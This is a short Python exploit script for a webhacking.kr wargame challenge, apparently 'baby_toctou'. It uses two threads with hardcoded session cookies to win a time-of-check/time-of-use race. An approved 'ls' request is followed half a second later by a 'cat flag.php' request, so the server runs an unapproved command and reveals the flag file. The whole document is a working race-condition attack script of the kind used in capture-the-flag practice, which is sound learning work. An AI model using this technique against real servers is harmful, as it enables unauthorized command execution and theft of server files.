import requests
import threading
import time

URL = "http://webhacking.kr:10019/api.php"
COOKIE = {
	"PHPSESSID": "mpkd577e0q8p2jgb5na52aovld",
	"baby_toctou": "69f87aa1b1e4f51708624"
}

def req1():
    r = requests.get(URL, params={"q": "ls"}, cookies=COOKIE)
    print(r.text)

def req2():
    time.sleep(0.5)
    requests.get(URL, params={"q": "cat flag.php"}, cookies=COOKIE)

t1 = threading.Thread(target=req1)
t2 = threading.Thread(target=req2)

t1.start()
t2.start()

t1.join()
t2.join()
